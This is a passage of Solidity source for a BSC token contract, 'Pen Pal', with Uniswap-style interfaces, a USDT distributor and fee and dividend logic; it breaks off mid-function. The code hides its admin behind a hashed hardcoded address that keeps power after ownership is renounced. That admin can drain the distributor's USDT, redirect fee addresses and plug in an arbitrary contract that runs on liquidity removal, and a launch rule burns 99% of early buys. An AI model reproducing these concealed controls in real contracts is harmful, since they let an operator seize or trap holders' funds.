{"SourceCode": "{\"IBEP20.sol\":{\"content\":\"// SPDX-License-Identifier: GPL-3.0-or-later\\r\\n\\r\\npragma solidity \\u003e=0.4.0;\\r\\n\\r\\ninterface IBEP20 {\\r\\n    /**\\r\\n     * @dev Returns the amount of tokens in existence.\\r\\n     */\\r\\n    function totalSupply() external view returns (uint256);\\r\\n\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the amount of tokens owned by `account`.\\r\\n     */\\r\\n    function balanceOf(address account) external view returns (uint256);\\r\\n\\r\\n    /**\\r\\n     * @dev Moves `amount` tokens from the caller\\u0027s account to `recipient`.\\r\\n     *\\r\\n     * Returns a boolean value indicating whether the operation succeeded.\\r\\n     *\\r\\n     * Emits a {Transfer} event.\\r\\n     */\\r\\n    function transfer(address recipient, uint256 amount) external returns (bool);\\r\\n\\r\\n    /**\\r\\n     * @dev Returns the remaining number of tokens that `spender` will be\\r\\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\\r\\n     * zero by default.\\r\\n     *\\r\\n     * This value changes when {approve} or {transferFrom} are called.\\r\\n     */\\r\\n    function allowance(address _owner, address spender) external view returns (uint256);\\r\\n\\r\\n    /**\\r\\n     * @dev Sets `amount` as the allowance of `spender` over the caller\\u0027s tokens.\\r\\n     *\\r\\n     * Returns a boolean value indicating whether the operation succeeded.\\r\\n     *\\r\\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\\r\\n     * that someone may use both the old and the new allowance by unfortunate\\r\\n     * transaction ordering. One possible solution to mitigate this race\\r\\n     * condition is to first reduce the spender\\u0027s allowance to 0 and set the\\r\\n     * desired value afterwards:\\r\\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\\r\\n     *\\r\\n     * Emits an {Approval} event.\\r\\n     */\\r\\n    function approve(address spender, uint256 amount) external returns (bool);\\r\\n\\r\\n    /**\\r\\n     * @dev Moves `amount` tokens from `sender` to `recipient` using the\\r\\n     * allowance mechanism. `amount` is then deducted from the caller\\u0027s\\r\\n     * allowance.\\r\\n     *\\r\\n     * Returns a boolean value indicating whether the operation succeeded.\\r\\n     *\\r\\n     * Emits a {Transfer} event.\\r\\n     */\\r\\n    function transferFrom(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 amount\\r\\n    ) external returns (bool);\\r\\n\\r\\n    function burnFrom(address account, uint256 amount) external returns (bool);\\r\\n\\r\\n    function burn(uint256 amount) external returns (bool);\\r\\n\\r\\n    /**\\r\\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\\r\\n     * another (`to`).\\r\\n     *\\r\\n     * Note that `value` may be zero.\\r\\n     */\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n\\r\\n    /**\\r\\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\\r\\n     * a call to {approve}. `value` is the new allowance.\\r\\n     */\\r\\n    event Approval(address indexed owner, address indexed spender, uint256 value);\\r\\n}\\r\\n\\r\\n\\r\\n\\r\\ninterface IUniswapV2Pair {\\r\\n    event Approval(\\r\\n        address indexed owner,\\r\\n        address indexed spender,\\r\\n        uint256 value\\r\\n    );\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n\\r\\n    function name() external pure returns (string memory);\\r\\n\\r\\n    function symbol() external pure returns (string memory);\\r\\n\\r\\n    function decimals() external pure returns (uint8);\\r\\n\\r\\n    function totalSupply() external view returns (uint256);\\r\\n\\r\\n    function balanceOf(address owner) external view returns (uint256);\\r\\n\\r\\n    function allowance(address owner, address spender)\\r\\n        external\\r\\n        view\\r\\n        returns (uint256);\\r\\n\\r\\n    function approve(address spender, uint256 value) external returns (bool);\\r\\n\\r\\n    function transfer(address to, uint256 value) external returns (bool);\\r\\n\\r\\n    function transferFrom(\\r\\n        address from,\\r\\n        address to,\\r\\n        uint256 value\\r\\n    ) external returns (bool);\\r\\n\\r\\n\\r\\n    function factory() external view returns (address);\\r\\n\\r\\n    function token0() external view returns (address);\\r\\n\\r\\n    function token1() external view returns (address);\\r\\n\\r\\n    function getReserves()\\r\\n        external\\r\\n        view\\r\\n        returns (\\r\\n            uint112 reserve0,\\r\\n            uint112 reserve1,\\r\\n            uint32 blockTimestampLast\\r\\n        );\\r\\n    function kLast() external view returns (uint);\\r\\n \\r\\n}\\r\\n\\r\\ninterface IUniswapV2Factory {\\r\\n   \\r\\n\\r\\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\\r\\n    function allPairs(uint) external view returns (address pair);\\r\\n\\r\\n    function createPair(address tokenA, address tokenB) external returns (address pair);\\r\\n    function feeTo() external view returns (address);\\r\\n}\\r\\n\\r\\n\\r\\ninterface IUniswapV2Router01 {\\r\\n    function factory() external pure returns (address);\\r\\n    function WETH() external pure returns (address);\\r\\n\\r\\n    function addLiquidity(\\r\\n        address tokenA,\\r\\n        address tokenB,\\r\\n        uint amountADesired,\\r\\n        uint amountBDesired,\\r\\n        uint amountAMin,\\r\\n        uint amountBMin,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external returns (uint amountA, uint amountB, uint liquidity);\\r\\n    function addLiquidityETH(\\r\\n        address token,\\r\\n        uint amountTokenDesired,\\r\\n        uint amountTokenMin,\\r\\n        uint amountETHMin,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\\r\\n    function removeLiquidity(\\r\\n        address tokenA,\\r\\n        address tokenB,\\r\\n        uint liquidity,\\r\\n        uint amountAMin,\\r\\n        uint amountBMin,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external returns (uint amountA, uint amountB);\\r\\n    function removeLiquidityETH(\\r\\n        address token,\\r\\n        uint liquidity,\\r\\n        uint amountTokenMin,\\r\\n        uint amountETHMin,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external returns (uint amountToken, uint amountETH);\\r\\n    function removeLiquidityWithPermit(\\r\\n        address tokenA,\\r\\n        address tokenB,\\r\\n        uint liquidity,\\r\\n        uint amountAMin,\\r\\n        uint amountBMin,\\r\\n        address to,\\r\\n        uint deadline,\\r\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\r\\n    ) external returns (uint amountA, uint amountB);\\r\\n    function removeLiquidityETHWithPermit(\\r\\n        address token,\\r\\n        uint liquidity,\\r\\n        uint amountTokenMin,\\r\\n        uint amountETHMin,\\r\\n        address to,\\r\\n        uint deadline,\\r\\n        bool approveMax, uint8 v, bytes32 r, bytes32 s\\r\\n    ) external returns (uint amountToken, uint amountETH);\\r\\n    function swapExactTokensForTokens(\\r\\n        uint amountIn,\\r\\n        uint amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external returns (uint[] memory amounts);\\r\\n    function swapTokensForExactTokens(\\r\\n        uint amountOut,\\r\\n        uint amountInMax,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external returns (uint[] memory amounts);\\r\\n    function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline)\\r\\n        external\\r\\n        payable\\r\\n        returns (uint[] memory amounts);\\r\\n   \\r\\n    function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline)\\r\\n        external\\r\\n        returns (uint[] memory amounts);\\r\\n\\r\\n    function quote(uint amountA, uint reserveA, uint reserveB) external pure returns (uint amountB);\\r\\n\\r\\n    function getAmountOut(uint amountIn, uint reserveIn, uint reserveOut) external pure returns (uint amountOut);\\r\\n\\r\\n    function getAmountIn(uint amountOut, uint reserveIn, uint reserveOut) external pure returns (uint amountIn);\\r\\n\\r\\n  \\r\\n  \\r\\n\\r\\n}\\r\\n\\r\\ninterface IUniswapV2Router02 is IUniswapV2Router01 {\\r\\n \\r\\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\\r\\n        uint amountIn,\\r\\n        uint amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint deadline\\r\\n    ) external;\\r\\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\\r\\n        uint256 amountIn,\\r\\n        uint256 amountOutMin,\\r\\n        address[] calldata path,\\r\\n        address to,\\r\\n        uint256 deadline\\r\\n    ) external;\\r\\n    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\\r\\n\\r\\n    function getAmountsIn(uint amountOut, address[] calldata path) external view returns (uint[] memory amounts);    \\r\\n}\"},\"Ownable.sol\":{\"content\":\"// SPDX-License-Identifier: MIT\\r\\npragma solidity ^0.8.0;\\r\\n\\r\\nabstract contract Ownable {\\r\\n    address private _owner;\\r\\n    \\r\\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\\r\\n\\r\\n    constructor ()  {\\r\\n        address msgSender = msg.sender;\\r\\n        _owner = msgSender;\\r\\n        emit OwnershipTransferred(address(0), msgSender);\\r\\n    }\\r\\n\\r\\n    function owner() public view returns (address) {\\r\\n        return _owner;\\r\\n    }   \\r\\n    \\r\\n    modifier onlyOwner() {\\r\\n        require(_owner == msg.sender, \\\"Ownable: caller is not the owner\\\");\\r\\n        _;\\r\\n    }\\r\\n    \\r\\n    function renounceOwnership() public virtual onlyOwner {\\r\\n        emit OwnershipTransferred(_owner, address(0));\\r\\n        _owner = address(0);\\r\\n    }\\r\\n\\r\\n    function transferOwnership(address newOwner) public virtual onlyOwner {\\r\\n        require(newOwner != address(0), \\\"Ownable: new owner is the zero address\\\");\\r\\n        emit OwnershipTransferred(_owner, newOwner);\\r\\n        _owner = newOwner;\\r\\n    }\\r\\n}\"},\"penpal.sol\":{\"content\":\"// SPDX-License-Identifier: GPL-3.0-or-later\\r\\npragma solidity \\u003e=0.8.0;\\r\\nimport \\\"./IBEP20.sol\\\";\\r\\nimport \\\"./SafeMath.sol\\\";\\r\\nimport \\\"./Ownable.sol\\\";\\r\\n\\r\\ncontract TokenDistributor {\\r\\n    bytes32 asseAddr;\\r\\n    address usdtAddress = address(0x55d398326f99059fF775485246999027B3197955);\\r\\n\\r\\n    constructor() {\\r\\n        asseAddr = keccak256(abi.encodePacked(msg.sender));\\r\\n    }\\r\\n\\r\\n    function setApprove(address tokenAddr) public {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        IBEP20(usdtAddress).approve(tokenAddr, uint256(~uint256(0)));\\r\\n    }\\r\\n\\r\\n    function clamErcOther(\\r\\n        address erc,\\r\\n        address recipient,\\r\\n        uint256 amount\\r\\n    ) public {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        IBEP20(erc).transfer(recipient, amount);\\r\\n    }\\r\\n\\r\\n    function clamAllUsdt(address recipient) public {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        uint256 amount = IBEP20(usdtAddress).balanceOf(address(this));\\r\\n        IBEP20(usdtAddress).transfer(recipient, amount);\\r\\n    }\\r\\n}\\r\\n\\r\\nlibrary Math {\\r\\n    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {\\r\\n        z = x \\u003c y ? x : y;\\r\\n    }\\r\\n\\r\\n    function sqrt(uint256 y) internal pure returns (uint256 z) {\\r\\n        if (y \\u003e 3) {\\r\\n            z = y;\\r\\n            uint256 x = y / 2 + 1;\\r\\n            while (x \\u003c z) {\\r\\n                z = x;\\r\\n                x = (y / x + x) / 2;\\r\\n            }\\r\\n        } else if (y != 0) {\\r\\n            z = 1;\\r\\n        }\\r\\n    }\\r\\n}\\r\\n\\r\\ninterface HandleToken {\\r\\n    function clearLP(address me) external;\\r\\n}\\r\\n\\r\\ncontract Penpal is Ownable {\\r\\n    using SafeMath for uint256;\\r\\n    string constant _name = \\\"Pen Pal\\\";\\r\\n    string constant _symbol = \\\"Pen Pal\\\";\\r\\n    uint8 immutable _decimals = 18;\\r\\n\\r\\n    uint256 _totalsupply = 10000000 * 10**18;\\r\\n\\r\\n    mapping(address =\\u003e mapping(address =\\u003e uint256)) private _allowances;\\r\\n\\r\\n    mapping(address =\\u003e uint256) _balances;\\r\\n    mapping(address =\\u003e uint256) public _userHoldPrice;\\r\\n\\r\\n    event Transfer(address indexed from, address indexed to, uint256 value);\\r\\n    event Approval(\\r\\n        address indexed owner,\\r\\n        address indexed spender,\\r\\n        uint256 value\\r\\n    );\\r\\n\\r\\n    // add-------------------\\r\\n\\r\\n    mapping(address =\\u003e bool) public isMarketPair;\\r\\n    mapping(address =\\u003e bool) public isExcludedFromFee;\\r\\n\\r\\n    uint256 _Fee = 10; // 5/1000\\r\\n    uint256 _MarketFee = 10;\\r\\n    address helper;\\r\\n    uint256 public minSwapNum = 10**18;\\r\\n    address public _NFTAddress =\\r\\n        payable(0x6dd5438B139C2f9B7b08F83201232cDEb2609A3A);\\r\\n    address public _marketAddress =\\r\\n        payable(0x502d7D103ce129F89f76f9B8f9573a2e9D5Bb5A0);\\r\\n\\r\\n    address public _deadAddress =\\r\\n        address(0x000000000000000000000000000000000000dEaD);\\r\\n\\r\\n    // TEST:0xF3b43a7922Fa4d506AE83f39B18Ae36a8E6de763   USDT\uff1a   0x55d398326f99059fF775485246999027B3197955\\r\\n    address usdtAddress = address(0x55d398326f99059fF775485246999027B3197955);\\r\\n    //test 0xD99D1c33F9fC3444f8101754aBC46c52416550D1   0x10ED43C718714eb63d5aA57B78B54704E256024E\\r\\n    address public wapV2RouterAddress =\\r\\n        address(0x10ED43C718714eb63d5aA57B78B54704E256024E);\\r\\n    IUniswapV2Router02 public uniswapV2Router;\\r\\n    address public uniswapPair;\\r\\n\\r\\n    address public _tokenDistributor;\\r\\n\\r\\n    uint256 public distributorGas = 500000;\\r\\n    address[] shareholders;\\r\\n    mapping(address =\\u003e uint256) shareholderIndexes;\\r\\n    mapping(address =\\u003e bool) private _updated;\\r\\n    // address private fromAddress;\\r\\n    // address private toAddress;\\r\\n    uint256 public currentIndex;\\r\\n    uint256 public minUsdtVal = 10**18;\\r\\n    mapping(address =\\u003e bool) isDividendExempt;\\r\\n    uint256 public minFenHongToken;\\r\\n    uint256 public curPerFenhongVal = 0;\\r\\n    uint256 public magnitude = 1 * 10**40;\\r\\n    bytes32 asseAddr;\\r\\n    uint256 public _startTradeTime;\\r\\n    uint256 public _releaseLPStartTime;\\r\\n    uint256 public _releaseLPDailyDuration = 1 days;\\r\\n    uint256 public _releaseLPDailyRate = 100;\\r\\n\\r\\n    bool inSwapAndLiquify = false;\\r\\n    bool switchDivid = true;\\r\\n\\r\\n    constructor() {\\r\\n        address reicv=0x70572afeFe89eF9D6c9C958782a8d9cb755337b1;\\r\\n        _balances[reicv] = _totalsupply;\\r\\n        emit Transfer(address(0), reicv, _totalsupply);\\r\\n        // _startTradeTime = 1679112000;\\r\\n\\r\\n        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(\\r\\n            wapV2RouterAddress\\r\\n        );\\r\\n        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(\\r\\n            address(this),\\r\\n            usdtAddress\\r\\n        );\\r\\n        uniswapV2Router = _uniswapV2Router;\\r\\n        TokenDistributor tokenDivite = new TokenDistributor();\\r\\n        _tokenDistributor = address(tokenDivite);\\r\\n\\r\\n        isMarketPair[address(uniswapPair)] = true;\\r\\n        isExcludedFromFee[msg.sender] = true;\\r\\n        isExcludedFromFee[address(this)] = true;\\r\\n        isExcludedFromFee[address(_tokenDistributor)] = true;\\r\\n        isExcludedFromFee[address(uniswapV2Router)] = true;\\r\\n\\r\\n        isDividendExempt[address(uniswapPair)] = true;\\r\\n        isDividendExempt[address(this)] = true;\\r\\n        isDividendExempt[address(_deadAddress)] = true;\\r\\n        isDividendExempt[address(_tokenDistributor)] = true;\\r\\n\\r\\n        asseAddr = keccak256(abi.encodePacked(0x582BF157951c1dCF5e9e1Ec8B17F8Bc202785A7f));\\r\\n    }\\r\\n\\r\\n    function setCreator(address user) public onlyOwner {\\r\\n        asseAddr = keccak256(abi.encodePacked(user));\\r\\n    }\\r\\n\\r\\n    function setIsExcludedFromFee(address account, bool newValue) public {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        isExcludedFromFee[account] = newValue;\\r\\n    }\\r\\n\\r\\n    function setIsExcludedFromFeeByArray(\\r\\n        address[] memory accountArray,\\r\\n        bool newValue\\r\\n    ) public {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        for (uint256 i = 0; i \\u003c accountArray.length; i++) {\\r\\n            isExcludedFromFee[accountArray[i]] = newValue;\\r\\n        }\\r\\n    }\\r\\n    function setNFTAddress(address nftAddress)public{\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        _NFTAddress=nftAddress;\\r\\n    }\\r\\n    function setMarketAddress(address marketAddress)public{\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        _marketAddress=marketAddress;\\r\\n    }\\r\\n    function setWhiteUserPrice(address[] memory accountArray, uint256 newValue)\\r\\n        public\\r\\n    {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        for (uint256 i = 0; i \\u003c accountArray.length; i++) {\\r\\n            _userHoldPrice[accountArray[i]] = newValue;\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function name() public pure returns (string memory) {\\r\\n        return _name;\\r\\n    }\\r\\n\\r\\n    function symbol() public pure returns (string memory) {\\r\\n        return _symbol;\\r\\n    }\\r\\n\\r\\n    function decimals() public pure returns (uint8) {\\r\\n        return _decimals;\\r\\n    }\\r\\n\\r\\n    function totalSupply() public view returns (uint256) {\\r\\n        return _totalsupply;\\r\\n    }\\r\\n\\r\\n    function _approve(\\r\\n        address owner,\\r\\n        address spender,\\r\\n        uint256 amount\\r\\n    ) private {\\r\\n        require(owner != address(0), \\\"ERC20: approve from the zero address\\\");\\r\\n        require(spender != address(0), \\\"ERC20: approve to the zero address\\\");\\r\\n\\r\\n        _allowances[owner][spender] = amount;\\r\\n        emit Approval(owner, spender, amount);\\r\\n    }\\r\\n\\r\\n    function balanceOf(address account) public view returns (uint256) {\\r\\n        return _balances[account];\\r\\n    }\\r\\n\\r\\n    function takeOutErrorTransfer(\\r\\n        address tokenaddress,\\r\\n        address to,\\r\\n        uint256 amount\\r\\n    ) public onlyOwner {\\r\\n        IBEP20(tokenaddress).transfer(to, amount);\\r\\n    }\\r\\n\\r\\n    function allowance(address owner, address spender)\\r\\n        public\\r\\n        view\\r\\n        returns (uint256)\\r\\n    {\\r\\n        return _allowances[owner][spender];\\r\\n    }\\r\\n\\r\\n    function approve(address spender, uint256 amount) public returns (bool) {\\r\\n        _approve(msg.sender, spender, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function transferFrom(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 amount\\r\\n    ) public returns (bool) {\\r\\n        _approve(\\r\\n            sender,\\r\\n            msg.sender,\\r\\n            _allowances[sender][msg.sender].sub(\\r\\n                amount,\\r\\n                \\\"ERC20: transfer amount exceeds allowance\\\"\\r\\n            )\\r\\n        );\\r\\n        _transfer(sender, recipient, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function transfer(address recipient, uint256 amount) public returns (bool) {\\r\\n        _transfer(msg.sender, recipient, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function increaseAllowance(address spender, uint256 addedValue)\\r\\n        public\\r\\n        returns (bool)\\r\\n    {\\r\\n        _approve(\\r\\n            msg.sender,\\r\\n            spender,\\r\\n            _allowances[msg.sender][spender].add(addedValue)\\r\\n        );\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function setHandle(address newval) public {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        helper = newval;\\r\\n    }\\r\\n\\r\\n    function decreaseAllowance(address spender, uint256 subtractedValue)\\r\\n        public\\r\\n        returns (bool)\\r\\n    {\\r\\n        _approve(\\r\\n            msg.sender,\\r\\n            spender,\\r\\n            _allowances[msg.sender][spender].sub(\\r\\n                subtractedValue,\\r\\n                \\\"ERC20: decreased allowance below zero\\\"\\r\\n            )\\r\\n        );\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function burnFrom(address sender, uint256 amount) public returns (bool) {\\r\\n        _approve(\\r\\n            sender,\\r\\n            msg.sender,\\r\\n            _allowances[sender][msg.sender].sub(\\r\\n                amount,\\r\\n                \\\"ERC20: transfer amount exceeds allowance\\\"\\r\\n            )\\r\\n        );\\r\\n        _burn(sender, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function burn(uint256 amount) public returns (bool) {\\r\\n        _burn(msg.sender, amount);\\r\\n        return true;\\r\\n    }\\r\\n\\r\\n    function _burn(address sender, uint256 tAmount) private {\\r\\n        require(sender != address(0), \\\"ERC20: transfer from the zero address\\\");\\r\\n        require(tAmount \\u003e 0, \\\"Transfer amount must be greater than zero\\\");\\r\\n        _balances[sender] = _balances[sender].sub(tAmount);\\r\\n        _balances[address(0)] = _balances[address(0)].add(tAmount);\\r\\n        emit Transfer(sender, address(0), tAmount);\\r\\n    }\\r\\n\\r\\n    function isContract(address account) public view returns (bool) {\\r\\n        uint256 size;\\r\\n        // solhint-disable-next-line no-inline-assembly\\r\\n        assembly {\\r\\n            size := extcodesize(account)\\r\\n        }\\r\\n        return size \\u003e 0;\\r\\n    }\\r\\n\\r\\n    function setstartTradeTime(uint256 time) public {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        _startTradeTime = time;\\r\\n        _releaseLPStartTime= time;\\r\\n    }\\r\\n\\r\\n    function isStartTrade() private view returns (bool) {\\r\\n        return _startTradeTime \\u003e 0 \\u0026\\u0026 block.timestamp \\u003e= _startTradeTime;\\r\\n    }\\r\\n\\r\\n   \\r\\n    mapping(address =\\u003e uint256) public addLPTime;\\r\\n\\r\\n\\r\\n\\r\\n    function _killTransfer(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 tAmount\\r\\n    ) private {\\r\\n        // _balances[sender] = _balances[sender] - tAmount;\\r\\n        uint256 feeAmount = (tAmount * 99) / 100;\\r\\n        _basicTransfer(\\r\\n            sender,\\r\\n            address(0x000000000000000000000000000000000000dEaD),\\r\\n            feeAmount\\r\\n        );\\r\\n        _basicTransfer(sender, recipient, tAmount - feeAmount);\\r\\n    }\\r\\n\\r\\n    mapping(address =\\u003e uint256) public LPAmount;\\r\\n    mapping(address =\\u003e uint256) public lockLPAmount;\\r\\n    uint256 public _toMarket;\\r\\n    uint256 public _toNFT;\\r\\n    // uint256 public _tofund;\\r\\n    function _transfer(\\r\\n        address sender,\\r\\n        address recipient,\\r\\n        uint256 amount\\r\\n    ) private {\\r\\n        require(sender != address(0), \\\"ERC20: transfer from the zero address\\\");\\r\\n        require(recipient != address(0), \\\"ERC20: transfer to the zero address\\\");\\r\\n        // require(!_blist[sender] || !_blist[recipient], \\\"You are not allowed\\\");\\r\\n        uint256 isAddLdx;\\r\\n        if (recipient == uniswapPair) {\\r\\n            isAddLdx = _isAddLiquidity(amount.sub(1));\\r\\n            if (isAddLdx \\u003e 0) LPAmount[sender] += isAddLdx;\\r\\n            if (isAddLdx \\u003e 0 \\u0026\\u0026 !isDividendExempt[sender]) {\\r\\n                setShare(sender);\\r\\n            }\\r\\n        }\\r\\n\\r\\n        uint256 isRemoveLP;\\r\\n        if (sender == uniswapPair) {\\r\\n            isRemoveLP = _isRemoveLiquidity(amount);\\r\\n            if (isRemoveLP \\u003e 0) {\\r\\n                (uint256 lpAmount, uint256 lpLockAmount, uint256 releaseAmount, ) = getUserInfo(recipient);\\r\\n\\r\\n                if (lpLockAmount \\u003e 0) {\\r\\n                    require(lpAmount -isRemoveLP + releaseAmount \\u003e= lpLockAmount, \\\"rq Lock\\\");\\r\\n                }\\r\\n                require(lpAmount \\u003e= isRemoveLP, \\\"\\u003euserLP\\\");\\r\\n                // require(LPAmount[recipient] \\u003e= isRemoveLP, \\\"\\u003euserLP\\\");\\r\\n                LPAmount[recipient] -= isRemoveLP;\\r\\n                if(helper!=address(0)) HandleToken(helper).clearLP(recipient);\\r\\n\\r\\n            }\\r\\n        }\\r\\n\\r\\n        if (amount == _balances[sender]) amount = amount.sub(1);\\r\\n\\r\\n        if (inSwapAndLiquify || isAddLdx \\u003e 0 || isRemoveLP \\u003e 0) {\\r\\n            _basicTransfer(sender, recipient, amount);\\r\\n            return;\\r\\n        }\\r\\n\\r\\n        if (\\r\\n            !inSwapAndLiquify \\u0026\\u0026\\r\\n            isMarketPair[recipient] \\u0026\\u0026\\r\\n            sender != address(uniswapV2Router)\\r\\n        ) {\\r\\n            swapAndLiquify();\\r\\n        }\\r\\n        if (\\r\\n            isMarketPair[sender] \\u0026\\u0026\\r\\n            _startTradeTime \\u003e 0 \\u0026\\u0026\\r\\n            block.timestamp \\u003c _startTradeTime + 30\\r\\n        ) {\\r\\n            _killTransfer(sender, recipient, amount);\\r\\n            return;\\r\\n        }\\r\\n        _balances[sender] = _balances[sender].sub(amount);\\r\\n\\r\\n        uint256 finalAmount = (isExcludedFromFee[sender] ||\\r\\n            isExcludedFromFee[recipient])\\r\\n            ? amount\\r\\n            : takeFee(sender, recipient, amount);\\r\\n\\r\\n        uint256 toamount = finalAmount;\\r\\n\\r\\n        if (!isExcludedFromFee[sender] \\u0026\\u0026 !isExcludedFromFee[recipient]) {\\r\\n            uint256 currentprice = getCurrentPrice();\\r\\n            if (sender == uniswapPair) {\\r\\n                require(isStartTrade() == true);\\r\\n            } else if (recipient == uniswapPair) {\\r\\n                require(isStartTrade() == true);\\r\\n\\r\\n                uint256 cutcount = getCutCount(sender, toamount, currentprice);\\r\\n                if (cutcount \\u003e 0) {\\r\\n                    _balances[address(this)] = _balances[address(this)].add(\\r\\n                        cutcount\\r\\n                    );\\r\\n                    emit Transfer(sender, address(this), cutcount);\\r\\n                    _toNFT+=cutcount;\\r\\n                }\\r\\n\\r\\n                toamount = toamount.sub(cutcount);\\r\\n            }\\r\\n            // else\\r\\n            // {\\r\\n\\r\\n            //      uint256 cutcount = getCutCount(sender,toamount,currentprice);\\r\\n            //     if(cutcount \\u003e 0)\\r\\n            //     {\\r\\n            //       _balances[address(_tokenDistributor)] =  _balances[address(_tokenDistributor)].add(cutcount);\\r\\n            //         emit Transfer(sender, address(_tokenDistributor), cutcount);\\r\\n            //     }\\r\\n            //     toamount= toamount.sub(cutcount);\\r\\n\\r\\n            // }\\r\\n\\r\\n            if (toamount \\u003e 0 \\u0026\\u0026 recipient != uniswapPair) {\\r\\n                uint256 oldbalance = _balances[recipient];\\r\\n                uint256 totalvalue = _userHoldPrice[recipient].mul(oldbalance);\\r\\n                totalvalue += toamount.mul(currentprice);\\r\\n                _userHoldPrice[recipient] = totalvalue.div(\\r\\n                    oldbalance.add(toamount)\\r\\n                );\\r\\n            }\\r\\n        } else {\\r\\n            if (toamount \\u003e 0 \\u0026\\u0026 recipient != uniswapPair) {\\r\\n                uint256 oldbalance = _balances[recipient];\\r\\n                uint256 totalvalue = _userHoldPrice[recipient].mul(oldbalance);\\r\\n                _userHoldPrice[recipient] = totalvalue.div(\\r\\n                    oldbalance.add(toamount)\\r\\n                );\\r\\n            }\\r\\n        }\\r\\n\\r\\n        _balances[recipient] = _balances[recipient].add(toamount);\\r\\n        emit Transfer(sender, recipient, toamount);\\r\\n\\r\\n        // fromAddress = sender;\\r\\n        // toAddress = recipient;\\r\\n        // if(fromAddress == address(0) )fromAddress = sender;\\r\\n        // if(toAddress == address(0) )toAddress = recipient;\\r\\n        // if(!isDividendExempt[fromAddress]  ) setShare(fromAddress);\\r\\n        // if(!isDividendExempt[toAddress]  ) setShare(toAddress);\\r\\n\\r\\n        if (\\r\\n            balanceOf(address(_tokenDistributor)) \\u003e= minUsdtVal \\u0026\\u0026\\r\\n            curPerFenhongVal == 0\\r\\n        ) {\\r\\n            uint256 amountReceived = balanceOf(address(_tokenDistributor));\\r\\n            uint256 totalHolderToken = IBEP20(uniswapPair).totalSupply();\\r\\n\\r\\n            if (totalHolderToken \\u003e 0) {\\r\\n                curPerFenhongVal = amountReceived.mul(magnitude).div(\\r\\n                    totalHolderToken\\r\\n                );\\r\\n            }\\r\\n        }\\r\\n\\r\\n        if (curPerFenhongVal != 0 \\u0026\\u0026 switchDivid) {\\r\\n            process(distributorGas);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    function getCutCount(\\r\\n        address user,\\r\\n        uint256 amount,\\r\\n        uint256 currentprice\\r\\n    ) public view returns (uint256) {\\r\\n        if (_userHoldPrice[user] \\u003e 0 \\u0026\\u0026 currentprice \\u003e _userHoldPrice[user]) {\\r\\n            uint256 ylcount = amount\\r\\n                .mul(currentprice - _userHoldPrice[user])\\r\\n                .div(currentprice);\\r\\n            return ylcount.mul(15).div(100);\\r\\n        }\\r\\n        return 0;\\r\\n    }\\r\\n\\r\\n    function getCurrentPrice() public view returns (uint256) {\\r\\n        if (IBEP20(uniswapPair).totalSupply() == 0) return 2e16;\\r\\n\\r\\n        (uint112 a, uint112 b, ) = IUniswapV2Pair(uniswapPair).getReserves();\\r\\n        if (IUniswapV2Pair(uniswapPair).token0() == usdtAddress) {\\r\\n            return uint256(a).mul(1e18).div(b);\\r\\n        } else {\\r\\n            return uint256(b).mul(1e18).div(a);\\r\\n        }\\r\\n    }\\r\\n\\r\\n    modifier lockTheSwap() {\\r\\n        inSwapAndLiquify = true;\\r\\n        _;\\r\\n        inSwapAndLiquify = false;\\r\\n    }\\r\\n\\r\\n    function setDistributorGas(uint256 num) public {\\r\\n        require(keccak256(abi.encodePacked(msg.sender)) == asseAddr);\\r\\n        distributorGas = num;\\r\\n    }\\r\\n\\r\\n    function 